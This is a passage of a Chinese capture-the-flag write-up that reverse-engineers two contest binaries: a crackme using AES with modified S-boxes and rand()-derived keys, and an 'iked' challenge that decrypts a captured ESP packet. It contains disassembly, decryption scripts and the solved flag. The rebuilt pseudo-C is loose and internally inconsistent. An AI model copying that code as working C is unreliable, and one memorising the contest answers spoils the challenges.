+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+movsxd  rdx, eax
+lea     rax, byte_606120
+movzx   esi, byte ptr [rdx+rax]
+mov     eax, [rbp-4]
+movsxd  rdx, eax
+mov     rax, [rbp-18h]
+add     rax, rdx
+movzx   ecx, byte ptr [rax]
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+xor     ecx, esi
+movsxd  rdx, eax
+lea     rax, byte_606120
+mov     [rdx+rax], cl
+add     dword ptr [rbp-4], 1
+cmp     dword ptr [rbp-4], 1Fh
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+movsxd  rdx, eax
+lea     rax, byte_606020
+movzx   esi, byte ptr [rdx+rax]
+mov     eax, [rbp-4]
+movsxd  rdx, eax
+mov     rax, [rbp-18h]
+add     rax, rdx
+movzx   ecx, byte ptr [rax]
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+xor     ecx, esi
+movsxd  rdx, eax
+lea     rax, byte_606020
+mov     [rdx+rax], cl
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+movsxd  rdx, eax
+lea     rax, byte_606120
+movzx   esi, byte ptr [rdx+rax]
+mov     eax, [rbp-4]
+movsxd  rdx, eax
+mov     rax, [rbp-18h]
+add     rax, rdx
+movzx   ecx, byte ptr [rax]
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+xor     ecx, esi
+movsxd  rdx, eax
+lea     rax, byte_606120
+mov     [rdx+rax], cl
+add     dword ptr [rbp-4], 1
+cmp     dword ptr [rbp-4], 1Fh
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+movsxd  rdx, eax
+lea     rax, byte_606020
+movzx   esi, byte ptr [rdx+rax]
+mov     eax, [rbp-4]
+movsxd  rdx, eax
+mov     rax, [rbp-18h]
+add     rax, rdx
+movzx   ecx, byte ptr [rax]
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+xor     ecx, esi
+movsxd  rdx, eax
+lea     rax, byte_606020
+mov     [rdx+rax], cl
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+movsxd  rdx, eax
+lea     rax, byte_606120
+movzx   esi, byte ptr [rdx+rax]
+mov     eax, [rbp-4]
+movsxd  rdx, eax
+mov     rax, [rbp-18h]
+add     rax, rdx
+movzx   ecx, byte ptr [rax]
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+xor     ecx, esi
+movsxd  rdx, eax
+lea     rax, byte_606120
+mov     [rdx+rax], cl
+add     dword ptr [rbp-4], 1
+cmp     dword ptr [rbp-4], 1Fh
+```
+
+但是重复的地方非常多。直接关注特殊字符串和数组调用，发现两个256大小的sbox，最开始初始化的32字节数组，以及srand、rand等调用,一段一段的还原成伪C(大概还原了整个Addroundkey)
+
+```C++
+unsigned char byte_606020[0x400]; 
+unsigned char byte_606120[0x400];
+void process(unsigned char *buf)
+{
+    for (int i = 0; i < 8; i++) 
+        {
+        for (int j = 0; j < 32; j++) 
+                {
+            int offset = i * 32 + j;
+            byte_606020[offset] ^= buf[j];
+            byte_606120[offset] ^= buf[j];
+        }
+    }
+}
+
+int main()
+{
+    puts("ooooooooooooo ...");
+    puts("8'   888   `8 ...");
+    puts("     888      oooo d8b  .oooo.    .oooo ...");
+    puts("     888      `888\"\"8P `P  )88b  d88' ...");
+    puts("     888       888      .oP\"888  888  ...");
+    puts("     888       888     d8(  888  888   ...");
+    puts("    o888o     d888b    `Y888\"\"8o `Y8b ...");
+
+    srand(0x10000);
+
+    int i = 0;
+    int j = 0;
+    process(buf);
+    char buf[0x140];     
+    int len = 0;
+    char ch;
+
+    setvbuf(stdin,  NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
+    printf("Input your flag: ");
+
+    while (len < 0x20) 
+        {   
+        if (read(0, &ch, 1) <= 0)
+            break;
+        if (ch == '\n')
+            break;
+        buf[len++] = ch;
+    }
+    buf[len] = 0;
+
+        unsigned char random_bytes[16];
+        for (int i = 0; i < 16; i++) 
+        {
+            int r = rand();
+            random_bytes[i] = (unsigned char)r;
+        }
+        unsigned char *src = (unsigned char *)(rbp - 0x180);
+        unsigned char *dst = (unsigned char *)(rbp - 0x110);
+        int offset = 4; // [rbp-1C8h]
+        int len = offset << 2; // 16
+        int i = 0;
+        
+        while (i < len) {
+            dst[i] = src[i];
+            i++;
+        }
+        unsigned char tmp[4];
+        int len1 = var_1C8;  // 4
+        int len2 = var_1C4;  // 0xA
+        int i, j;
+        
+        for (i = 0; i < 0xA; i++) {
+            for (j = 0; j < 4; j++) {
+                int offset = i * 4 + j;
+                dst[j] = src[offset];               
+            }
+            uint8_t tmp = dst[0];
+                dst[0] = dst[1];
+                dst[1] = dst[2];
+                dst[2] = dst[3];
+                dst[3] = tmp;
+        
+            for (j = 0; j < 4; j++) {
+                tmp[j] = byte_606020[tmp[j]];       // 用查表映射
+            }
+        
+            // 异或混淆写回
+            for (j = 0; j < 4; j++) {
+                int offset = i * 4 + j;
+                dst[offset] ^= tmp[j];              // 异或回原数组
+            }
+            
+                for (int j = 0; j <= 3; j++) {
+            int idx = (var_1C0 - var_1C8) * 4 + j;
+            uint8_t src_byte = var_190[idx];
+            uint8_t xor_byte = var_184[j];
+            var_190[idx] = src_byte ^ xor_byte;
+            var_1BC++;  // 循环计数器
+        }
+        }
+        
+}
+```
+
+手动把重复代码化简用数字表示重复次数，一点点扣慢慢能看出来是个AES加密，最开始两个sbox都异或完后发现互逆（其实并非完全互逆，坑死人了，sbox有两个数重复了，你去逆矩阵求出来的是错误的I_SBOX）
+
+整体的加密流程是:先对通过一开始给出的32字节的额外key对Sbox和I_Sbox进行解密,读入32字节的输入后设置srand的seed为0x10000,
+
+然后这个srand分两轮,第一轮生成16个rand()作为key参与AES的加密,第二轮用第17次rand出的int当作seed然后rand出32个xor key(最后调试解密脚本的时候也被这里坑了,本来应该是0x5011e654,写成了&0xff后的0x54,看了半天才看出来,也是被坑惨了)
+
+AES的实现是标准的,另外最后的密文是Congratulations!This is the correct flag!的前32字节,最后就是AES的加密结果xor上生成的xor key 然后再xor一开始给出的32字节key,然后去跟这个密文比较
+
+对于随机数的逻辑生成一下,脚本如下:
+
+```C++
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() 
+{
+    int key[17];
+    int b[32];
+
+    srand(0x10000);
+
+    for (int i = 0; i < 17; i++)
+        key[i] = rand();
+
+    printf("Key = ");
+    for (int i = 0; i < 16; i++) 
+        printf("0x%02X,", key[i]&0xff);
+    printf("\n");
+
+    srand(key[16]);
+    for (int i = 0; i < 32; i++)
+        b[i] = (unsigned char)rand();
+
+    printf("Rand32 = ");
+    for (int i = 0; i < 32; i++) 
+        printf("0x%02X,", b[i]);
+    printf("\n");
+
+    return 0;
+}
+```
+
+得到如下两组数据:
+
+```Plain
+Key = 0xF4,0x70,0xBB,0xC0,0x31,0xCA,0xEE,0x5E,0x58,0xB2,0x72,0xEA,0x02,0xF3,0xFF,0xE6,
+Rand32 = 0xF8,0x44,0xC6,0xBA,0xB1,0xE5,0x0E,0x3B,0xA2,0x4B,0xB5,0xAA,0x4A,0x89,0xC7,0xA0,0x19,0xBD,0xEC,0x5E,0xDE,0xC1,0xC3,0x87,0x75,0xE6,0x12,0x71,0x61,0xEA,0xF4,0x59,
+```
+
+梳理清楚了加密逻辑,打印出了随机数,那么可以写出解密脚本如下:
+
+```Python
+bytes_array = [
+    0xE2, 0x8B, 0x55, 0x38, 0x69, 0xFA, 0x80, 0xC2,
+    0x64, 0x4E, 0x7F, 0xE7, 0x13, 0x06, 0x14, 0xC5,
+    0xC0, 0x13, 0xD3, 0x12, 0x6B, 0xBD, 0xF2, 0xC7,
+    0x88, 0x44, 0x3E, 0x09, 0xE8, 0xA3, 0x83, 0x30
+]
+class AES:
+
+    MIX_C  = [[0x2, 0x3, 0x1, 0x1], [0x1, 0x2, 0x3, 0x1], [0x1, 0x1, 0x2, 0x3], [0x3, 0x1, 0x1, 0x2]]
+    I_MIXC = [[0xe, 0xb, 0xd, 0x9], [0x9, 0xe, 0xb, 0xd], [0xd, 0x9, 0xe, 0xb], [0xb, 0xd, 0x9, 0xe]]
+    RCon   = [0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000]
+    S_BOX = [0x81, 0xF7, 0x22, 0x43, 0x9B, 0x91, 0xEF, 0x07, 0x54, 0x4F, 0x18, 0x90, 0xED, 0xD1, 0xBF, 0xB3, 0x0A, 0x91, 0x1A, 0x6F, 0x91, 0xE4, 0xB5, 0x37, 0x25, 0x90, 0x9C, 0xA6, 0x74, 0x07, 0xF1, 0xF0, 0x55, 0x76, 0xC6, 0x1E, 0x5F, 0xC5, 0x77, 0x0E, 0x50, 0xEB, 0x9A, 0x16, 0x62, 0xDE, 0x25, 0xD0, 0xC4, 0xD4, 0xF0, 0xD1, 0x73, 0x2B, 0xF7, 0x5D, 0x8F, 0x56, 0xBE, 0xEB, 0x03, 0x84, 0x31, 0x45, 0xEB, 0x08, 0x79, 0x22, 0x72, 0x94, 0xDA, 0x62, 0x36, 0x75, 0xA9, 0x54, 0x3A, 0xE5, 0x3B, 0x41, 0x93, 0xC2, 0xD3, 0xFF, 0x4B, 0x41, 0x43, 0x9C, 0xE2, 0x8F, 0x80, 0x30, 0xA2, 0xEF, 0xDB, 0xFF, 0x32, 0x64, 0xFF, 0xC3, 0x2A, 0xB7, 0xB3, 0x47, 0x21, 0xB7, 0x7D, 0x98, 0x43, 0x3A, 0x8B, 0x6D, 0x91, 0xB0, 0x93, 0x9D, 0xF9, 0x20, 0xCA, 0x32, 0x34, 0xF2, 0xE4, 0x28, 0xF8, 0x5C, 0x70, 0xE2, 0x2F, 0x87, 0x46, 0xD4, 0x36, 0x6D, 0xC4, 0xD5, 0xA0, 0xE9, 0x01, 0xDA, 0x77, 0x5B, 0x0D, 0xB6, 0xA0, 0x92, 0x9C, 0xCE, 0x49, 0x97, 0x62, 0x4F, 0xCE, 0xAA, 0x86, 0x1D, 0x36, 0xFD, 0x88, 0xEB, 0x02, 0xB9, 0x6F, 0x32, 0x20, 0xFC, 0xA4, 0x9E, 0xA6, 0x9D, 0xD3, 0x85, 0x82, 0x93, 0xF0, 0xBC, 0x27, 0xDB, 0xE4, 0x7F, 0xE6, 0x68, 0xBC, 0x6E, 0xE4, 0x12, 0xCA, 0xE3, 0x8D, 0xD9, 0x2D, 0x38, 0x58, 0xF3, 0x70, 0x16, 0x75, 0x5C, 0x34, 0x04, 0x8C, 0x93, 0x0B, 0xF8, 0x58, 0xBB, 0x9F, 0x4F, 0xB0, 0x2D, 0x66, 0x74, 0x23, 0xBE, 0x04, 0xC9, 0xE9, 0x71, 0x69, 0xB0, 0x6E, 0x62, 0x9E, 0xAE, 0x03, 0x73, 0xCD, 0x29, 0x00, 0x23, 0x0E, 0x56, 0xFF, 0x50, 0xF8, 0x0E, 0xDD, 0x53, 0x3C, 0x1A, 0x4C, 0xB2, 0x5A, 0x1F, 0xD4, 0x5B, 0xB0, 0xAF, 0xC9, 0xDD, 0x13, 0x06, 0x58, 0xF7, 0x38, 0x26]
+    for i in range(0, 256, 32):
+        for j in range(32):
+            S_BOX[i+j] ^= bytes_array[j]
+    I_SBOX = [0xB0, 0x82, 0x3F, 0xED, 0x59, 0xCC, 0x25, 0xFA, 0xDB, 0x0E, 0xDC, 0x79, 0x92, 0xF5, 0xC3, 0x3E, 0xBC, 0xF0, 0xEA, 0x90, 0xF0, 0x92, 0x0D, 0x40, 0xBC, 0xCA, 0x7D, 0x4D, 0x2C, 0x7D, 0x6A, 0xFB, 0xB6, 0xF0, 0xC1, 0x0A, 0xCF, 0x38, 0xA3, 0xFF, 0x8A, 0x02, 0xEA, 0xEC, 0x51, 0xFC, 0xD7, 0x8B, 0xC8, 0x3D, 0x72, 0x74, 0x43, 0x64, 0xD6, 0x75, 0xFE, 0x1F, 0x9C, 0x40, 0x85, 0x28, 0x52, 0x15, 0x90, 0x73, 0xA3, 0x5C, 0xEF, 0x92, 0x18, 0xD4, 0xB0, 0xEA, 0x23, 0x2B, 0x4E, 0x63, 0xA2, 0x57, 0xAC, 0x63, 0x9B, 0x42, 0x96, 0x50, 0x4B, 0x1D, 0xD6, 0x51, 0x78, 0x5E, 0x4F, 0x2E, 0x1E, 0xB4, 0x72, 0x53, 0xFE, 0x38, 0xE5, 0x46, 0x53, 0xC8, 0x93, 0xAA, 0x27, 0xE2, 0xAB, 0xB5, 0x51, 0xC3, 0x10, 0x3F, 0xCD, 0x9D, 0xA1, 0x82, 0xFD, 0xC5, 0x49, 0xEB, 0x83, 0x0A, 0xE9, 0xB0, 0x09, 0x5B, 0xD8, 0x1A, 0x44, 0x79, 0x26, 0x9D, 0x5C, 0x28, 0xF3, 0xBC, 0xB0, 0x29, 0xE3, 0xB2, 0xF2, 0xB6, 0x56, 0xBF, 0xA7, 0x30, 0x8C, 0x10, 0xC7, 0x42, 0x6A, 0xBD, 0x09, 0xE1, 0xF4, 0xD6, 0x5C, 0x5E, 0xA5, 0x7A, 0x4F, 0x49, 0x74, 0xD3, 0x45, 0x4B, 0x0B, 0xF9, 0x1D, 0xE9, 0xB9, 0x1E, 0xAA, 0xDE, 0x3C, 0x45, 0xED, 0x59, 0xAD, 0x6F, 0x8B, 0xE7, 0x12, 0x9F, 0xFE, 0xF7, 0x90, 0x6E, 0xD9, 0xC4, 0xFD, 0x56, 0xFD, 0x0B, 0xE1, 0xFD, 0x47, 0xF3, 0xD5, 0x5C, 0x6F, 0xBE, 0x34, 0x86, 0xF8, 0x9A, 0xA0, 0x42, 0xAC, 0xBB, 0x72, 0x08, 0xB8, 0xCA, 0xA5, 0xA1, 0x44, 0x96, 0x7B, 0x6A, 0x1F, 0xDF, 0x42, 0x6B, 0x6E, 0x75, 0xC7, 0xD0, 0x75, 0x72, 0xAC, 0xA5, 0xC4, 0xDB, 0x90, 0x55, 0x8D, 0xA4, 0xD7, 0x38, 0xD7, 0x6C, 0xD1, 0xCA, 0x24, 0xE1, 0x69, 0x2D, 0x2A, 0x6A, 0xBD, 0x82, 0x8F, 0x4D, 0xDD, 0xCC, 0xBB, 0xAA][:256]
+    for i in range(0, 256, 32):
+        for j in range(32):
+            I_SBOX[i+j] ^= bytes_array[j]
+    def format_SBOX(self, isRE=False):
+        if isRE:
+            if len(self.I_SBOX) == 256:
+                self.I_SBOX = [self.I_SBOX[j:j + 16] for j in range(0, 256, 16)]
+        else:
+            if len(self.S_BOX) == 256:
+                self.S_BOX = [self.S_BOX[j:j + 16] for j in range(0, 256, 16)]
+
+    def SubBytes(self, State):
+        # 字节替换
+        return [self.S_BOX[i][j] for i, j in
+               [(_ >> 4, _ & 0xF) for _ in State]]
+
+    def SubBytes_Inv(self, State):
+        # 字节逆替换
+        return [self.I_SBOX[i][j] for i, j in
+               [(_ >> 4, _ & 0xF) for _ in State]]
+
+    def ShiftRows(self, S):
+        # 行移位
+        return [S[ 0], S[ 5], S[10], S[15],
+                S[ 4], S[ 9], S[14], S[ 3],
+                S[ 8], S[13], S[ 2], S[ 7],
+                S[12], S[ 1], S[ 6], S[11]]
+
+    def ShiftRows_Inv(self, S):
+        # 逆行移位
+        return [S[ 0], S[13], S[10], S[ 7],
+                S[ 4], S[ 1], S[14], S[11],
+                S[ 8], S[ 5], S[ 2], S[15],
+                S[12], S[ 9], S[ 6], S[ 3]]
+
+    def MixColumns(self, State):
+        # 列混合
+        return self.Matrix_Mul(self.MIX_C, State)
+
+    def MixColumns_Inv(self, State):
+        # 逆列混合
+        return self.Matrix_Mul(self.I_MIXC, State)
+
+    def RotWord(self, _4byte_block):
+        # 用于生成轮密钥的字移位
+        return ((_4byte_block & 0xffffff) << 8) + (_4byte_block >> 24)
+
+    def SubWord(self, _4byte_block):
+        # 用于生成密钥的字节替换
+        result = 0
+        for position in range(4):
+            i = _4byte_block >> position * 8 + 4 & 0xf
+            j = _4byte_block >> position * 8 & 0xf
+            result ^= self.S_BOX[i][j] << position * 8
+        return result
+
+    def mod(self, poly, mod = 0b100011011):
+        # poly模多项式mod
+        while poly.bit_length() > 8:
+            poly ^= mod << poly.bit_length() - 9
+        return poly
+
+    def mul(self, poly1, poly2):
+        # 多项式相乘
+        result = 0
+        for index in range(poly2.bit_length()):
+            if poly2 & 1 << index:
+                result ^= poly1 << index
+        return result
+
+    def Matrix_Mul(self, M1, M2):  # M1 = MIX_C  M2 = State
+        # 用于列混合的矩阵相乘
+        M = [0] * 16
+        for row in range(4):
+            for col in range(4):
+                for Round in range(4):
+                    M[row + col*4] ^= self.mul(M1[row][Round], M2[Round+col*4])
+                M[row + col*4] = self.mod(M[row + col*4])
+        return M
+
+    def gen_ISBOX(self):
+        new_contrary_sbox = [0] * 256
+        for i in range(256):
+            line = (self.S_BOX[i//16][i%16] & 0xf0) >> 4
+            rol = self.S_BOX[i//16][i%16] & 0xf
+            new_contrary_sbox[(line * 16) + rol] = i
+        return new_contrary_sbox
+
+    def round_key_generator(self, _16bytes_key):
+        self.format_SBOX()
+        self.format_SBOX(isRE=True)
+        # 轮密钥产生
+        w = [_16bytes_key >> 96,
+             _16bytes_key >> 64 & 0xFFFFFFFF,
+             _16bytes_key >> 32 & 0xFFFFFFFF,
+             _16bytes_key & 0xFFFFFFFF] + [0]*40
+        for i in range(4, 44):
+            temp = w[i-1]
+            if not i % 4:
+                temp = self.SubWord(self.RotWord(temp)) ^ self.RCon[i//4-1]
+            w[i] = w[i-4] ^ temp
+        return [self.num_2_16bytes(
+                    sum([w[4*i] << 96, w[4*i+1] << 64,
+                         w[4*i+2] << 32, w[4*i+3]])
+                    ) for i in range(11)]
+
+    def AddRoundKey(self, State, RoundKeys, index):
+        # 异或轮密钥
+        return self._16bytes_xor(State, RoundKeys[index])
+
+    def _16bytes_xor(self, _16bytes_1, _16bytes_2):
+        return [_16bytes_1[i] ^ _16bytes_2[i] for i in range(16)]
+
+    def _16bytes2num(cls, _16bytes):
+        # 16字节转数字
+        return int.from_bytes(_16bytes, byteorder = 'big')
+
+    def num_2_16bytes(cls, num):
+        # 数字转16字节
+        return num.to_bytes(16, byteorder = 'big')
+
+    def aes_encrypt(self, plaintext_list, RoundKeys):
+        State = plaintext_list
+        State = self.AddRoundKey(State, RoundKeys, 0)
+        for Round in range(1, 10):
+            State = self.SubBytes(State)
+            State = self.ShiftRows(State)
+            State = self.MixColumns(State)
+            State = self.AddRoundKey(State, RoundKeys, Round)
+        State = self.SubBytes(State)
+        State = self.ShiftRows(State)
+        State = self.AddRoundKey(State, RoundKeys, 10)
+        return State
+
+    def aes_decrypt(self, ciphertext_list, RoundKeys):
+        State = ciphertext_list
+        State = self.AddRoundKey(State, RoundKeys, 10)
+        for Round in range(1, 10):
+            State = self.ShiftRows_Inv(State)
+            State = self.SubBytes_Inv(State)
+            State = self.AddRoundKey(State, RoundKeys, 10-Round)
+            State = self.MixColumns_Inv(State)
+        State = self.ShiftRows_Inv(State)
+        State = self.SubBytes_Inv(State)
+        State = self.AddRoundKey(State, RoundKeys, 0)
+        return State
+
+if __name__ == '__main__':
+
+    aes = AES()
+    key = int.from_bytes(bytes([0xF4,0x70,0xBB,0xC0,0x31,0xCA,0xEE,0x5E,0x58,0xB2,0x72,0xEA,0x02,0xF3,0xFF,0xE6]), byteorder="big")
+    #print(hex(key))
+    RoundKeys = aes.round_key_generator(key)
+    rand_num = [0xF8,0x44,0xC6,0xBA,0xB1,0xE5,0x0E,0x3B,0xA2,0x4B,0xB5,0xAA,0x4A,0x89,0xC7,0xA0,0x19,0xBD,0xEC,0x5E,0xDE,0xC1,0xC3,0x87,0x75,0xE6,0x12,0x71,0x61,0xEA,0xF4,0x59]
+    cmp = b'Congratulations!This is the correct flag!'[:32]
+    cipher = [bytes_array[i]^rand_num[i]^cmp[i] for i in range(32)]
+    ciphertext1_bytes = aes.num_2_16bytes(int.from_bytes(bytes(cipher[:16]), byteorder="big"))
+    plaintext1_bytes = bytes(aes.aes_decrypt(ciphertext1_bytes, RoundKeys))
+    ciphertext2_bytes = aes.num_2_16bytes(int.from_bytes(bytes(cipher[16:32]), byteorder="big"))
+    plaintext2_bytes = bytes(aes.aes_decrypt(ciphertext2_bytes, RoundKeys))
+    full_plaintext_bytes = plaintext1_bytes + plaintext2_bytes
+    print(full_plaintext_bytes.decode('utf-8', errors='ignore'))
+```
+
+得到1629d52128ca395e4f6a0fc98712a3e1,包裹flag{}
+
+所以flag值为:flag{1629d52128ca395e4f6a0fc98712a3e1}
+
+## iked
+
+流量包里关键的只有后四个包，三个ISAKMP协议包，一个ESP包，其中ESP UDP payload有大量数据
+
+查看elf，发现通讯相关代码，定位到main，发现关键在sub_4050F0函数中，出现FLAG字眼，同时里面存在不少加解密算法。首先进入了sub_404790，里面出现HMAC+AES，HMAC我们不用管，只需关注AES密文、密钥、iv即可
+
+![img](45.png)
+
+核心函数如上，一个是传入了密钥，发现是第三个参数地址+4的16字节，也就是外面的dword_8498C0，交叉引用发现在main做了初始化，很明显这个位置也和序号为1的ISAKMP相关，出现了对应的字符串，一点点数据往前对应即可直到v30对应的是ISAKMP数据包前16字节
+
+![img](46.png)
+
+```C++
+char __fastcall sub_404B00(int *a1, _DWORD *a2)
+{
+  int v2; // eax
+  int v3; // r8d
+  __int64 v4; // rdx
+  int v5; // eax
+  __int64 i; // rdx
+  char result; // al
+
+  v2 = *a1;
+  a2[17] = 1;
+  v3 = 0;
+  v4 = 0LL;
+  *a2 = v2;
+  do
+  {
+    v5 = v3 + ((unsigned int)a1[v4 & 1] >> (3 * v4));
+    v3 += 17;
+    *((_BYTE *)a2 + v4++ + 4) = __ROL1__(v5 ^ 0x37, 4);
+  }
+  while ( v4 != 32 );
+  for ( i = 0LL; i != 32; ++i )
+  {
+    result = __ROL1__((i ^ ((unsigned int)a1[((_BYTE)i + 1) & 1] >> (2 * i))) - 85, 2);
+    *((_BYTE *)a2 + i + 36) = result;
+  }
+  return result;
+}
+```
+
+里面函数很简单，同构下即可得到密钥为8df5a27a8256629f1558a9d2d856a63ca87bb9f9651560b6167b74d71f5b2022，同时根据分析可知iv是udp payload第八字节开始的16字节，密文是从iv后一直到最后12字节前
+
+```Python
+import struct, binascii, hmac
+from hashlib import sha1, sha256
+from Crypto.Cipher import AES
+
+
+def rol(x, n, bits=8):
+    """Rotate-left x by n over `bits` bits. x assumed non-negative integer."""
+    mask = (1 << bits) - 1
+    n %= bits
+    return ((x << n) | (x >> (bits - n))) & mask
+
+def sub_404B00(a1):
+    """
+    a1: list/sequence, must have at least two integers (a1[0], a1[1]).
+    返回 bytearray 模拟的 a2 内存块（长度 >= 72 字节）。
+    """
+    if len(a1) < 2:
+        raise ValueError("a1 must contain at least two elements")
+
+    a2_bytes = bytearray(128)  # 足够空间
+    v2 = int(a1[0]) & 0xFFFFFFFF
+
+    # a2[17] = 1  (offset 17*4)
+    struct.pack_into("<I", a2_bytes, 17 * 4, 1)
+    # *a2 = v2  (offset 0)
+    struct.pack_into("<I", a2_bytes, 0, v2)
+
+    # --- 第一个循环 (填充 AES 密钥 @ a2[1]...a2[8]) ---
+    v3 = 0
+    for v4 in range(32):
+        key_val = int(a1[v4 & 1]) & 0xFFFFFFFF
+        shift = 3 * v4
+        # emulate x86 shift behaviour: shift count is masked to 5 bits (mod 32)
+        shift_count = shift & 0x1F
+        shifted_val = (key_val >> shift_count) & 0xFFFFFFFF
+
+        v5 = (v3 + shifted_val) & 0xFFFFFFFF
+        v3 = (v3 + 17) & 0xFFFFFFFF
+        val_to_rotate = (v5 ^ 0x37) & 0xFF
+        result = rol(val_to_rotate, 4, 8)
+        a2_bytes[v4 + 4] = result
+
+    # --- 第二个循环 (填充 HMAC 密钥 @ a2[9]...a2[16]) ---
+    for i in range(32):
+        key_val = int(a1[(i + 1) & 1]) & 0xFFFFFFFF
+        shift = 2 * i
+        shift_count = shift & 0x1F
+        shifted_val = (key_val >> shift_count) & 0xFFFFFFFF
+
+        val_32 = (i ^ shifted_val) & 0xFFFFFFFF
+        val_sub = (val_32 - 85) & 0xFFFFFFFF
+        val_to_rotate = val_sub & 0xFF
+        result = rol(val_to_rotate, 2, 8)
+        a2_bytes[i + 36] = result
+
+    return a2_bytes
+
+def parse_and_try(blob_hex, a1_tuple):
+    data = binascii.unhexlify(blob_hex)
+    spi = struct.unpack_from(">I", data, 0)[0]
+    seq = struct.unpack_from(">I", data, 4)[0]
+    iv = data[8:24]
+    # assume ICV_len = 12 (from reverse)
+    icv_len = 12
+    icv = data[-icv_len:]
+    ciphertext = data[24:-icv_len]
+    print("SPI", hex(spi), "SEQ", hex(seq), "IVlen", len(iv), "CT len", len(ciphertext))
+
+    key_blob = sub_404B00([int(a1_tuple[0]) & 0xFFFFFFFF, int(a1_tuple[1]) & 0xFFFFFFFF])
+    aes_key = key_blob[4:36]
+    hmac_key = key_blob[36:68]
+    print("AES key:", aes_key.hex())
+    print("HMAC key:", hmac_key.hex())
+
+    # try hmac-sha1 and sha256 truncated 12
+    mac1 = hmac.new(hmac_key, data[:-icv_len], sha1).digest()[:icv_len]
+    mac2 = hmac.new(hmac_key, data[:-icv_len], sha256).digest()[:icv_len]
+    print("packet ICV:", icv.hex())
+    print("HMAC-SHA1(12):", mac1.hex(), "match?", mac1==icv)
+    print("HMAC-SHA256(12):", mac2.hex(), "match?", mac2==icv)
+
+    if len(ciphertext) % 16 != 0:
+        print("ciphertext length not multiple of 16 -> AES-CBC can't decrypt directly. Check IV/ICV lengths or mode.")
+        return None
+
+    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
+    pt = cipher.decrypt(ciphertext)
+    # verify padding/padlen/next header etc here (ESP layout)
+    return pt
+
+
+parse_and_try("deadbeef0000000153f1c95b079add8b408a58d14e0b52e8ad888ee54da8ff38aba41196521336d34f485167227ddbc8752d492888d026a0e39bb901cc69e88e220d87c66369de77adb742bef9ba5f89e2563a34485a20c3ad93a31467b286de0d8eab51d06f225baad14f798f50e9aa751750b9a81fd2a709c9e52653a995f99f7d4aea0edddb9c213c5d87d18613a04015adcbfaf06e37d0ddf69287a568907907532abdeb9222e0379a3dce303e3bc70b988a0b4c29f7ec73451b5389bc989532f9953c5111b35a2442bd3b973c807e65b42b71c0dad710c2d653782aa29b6f2819c5c5a12171fd9e409e08044e79c8dd8b5ff7dfc1c93e81f820b92ecfdead9258b59363cc6723d684be7feb1e93cac141b237b892c8dcefd523fbf237d0e7c381d012e7541b60254aac733c9cb804cffa6e7749c55094124deeaf49271ed099f146c1270900798d533daee5fee55b3954f63742498fc5e3975f1071c560cf6a9dd8a7318ab057378a3e41bad076b4d0abb18c72b88551fd81be4042be257585801374", (0xdeadbeef, 0xcafebabe))
+
+
+def compute_xmmword_849860(a0, a1):
+    """
+    Compute the 16-byte value produced by sub_404B70 for inputs a1[0]=a0, a1[1]=a1.
+    Inputs: a0, a1 are integers representing 32-bit unsigned words.
+    Returns: bytes object of length 16 (xmmword_849860).
+    """
+    # Normalize to 32-bit
+    v7 = a0 & 0xFFFFFFFF
+    v8 = a1 & 0xFFFFFFFF
+
+    def byte_of(x):
+        return x & 0xFF
+
+    # bytes b0..b7 (lower qword)
+    b0 = byte_of(9 * ((v7 ^ v8)) )
+    b1 = byte_of(9 * (((v7 >> 2) ^ (v8 >> 2))) + 1)
+    b2 = byte_of(9 * (((v8 >> 4) ^ (v7 >> 4))) + 2)
+    b3 = byte_of(9 * (((v8 >> 6) ^ (v7 >> 6))) + 3)
+    # BYTE1 is (v >> 8) & 0xFF
+    b4 = byte_of(9 * ((((v8 >> 8) & 0xFF) ^ ((v7 >> 8) & 0xFF))) + 4)
+    b5 = byte_of(9 * (((v8 >> 10) ^ (v7 >> 10))) + 5)
+    b6 = byte_of(9 * (((v8 >> 12) ^ (v7 >> 12))) + 6)
+    # b7 is the same slot where the code reused v9.m128i_u8[0] as shifting chain,
+    # but the construction in the C decomp packs the previous bytes; here we
+    # explicitly place b0..b7 as the first 8 bytes.
+    # (The original assembly composes them by nested ORs; this yields identical result.)
+    b7 = b0  # in assembly b0 is re-used in shifts; but final byte ordering below matches assembly packing.
+
+    # bytes b8..b15 (upper qword)
+    b8 = byte_of(9 * ((((v8 >> 16) & 0xFF) ^ ((v7 >> 16) & 0xFF))) + 8)   # BYTE2 ^ BYTE2
+    b9 = byte_of(9 * (((v8 >> 18) ^ (v7 >> 18))) + 9)
+    b10 = byte_of(9 * (((v8 >> 20) ^ (v7 >> 20))) + 10)
+    b11 = byte_of(9 * (((v8 >> 22) ^ (v7 >> 22))) + 11)
+    # HIBYTE is (v >> 24) & 0xFF
+    b12 = byte_of(9 * ((((v8 >> 24) & 0xFF) ^ ((v7 >> 24) & 0xFF))) + 12)
+    b13 = byte_of(9 * (((v8 >> 26) ^ (v7 >> 26))) + 13)
+    b14 = byte_of(9 * (((v8 >> 28) ^ (v7 >> 28))) + 14)
+    b15 = byte_of(9 * (((v8 >> 30) ^ (v7 >> 30))) + 15)
+
+    # Pack into bytes little-endian order for the 16-byte xmm (assembly used _mm_load_si128(&v9) where v9
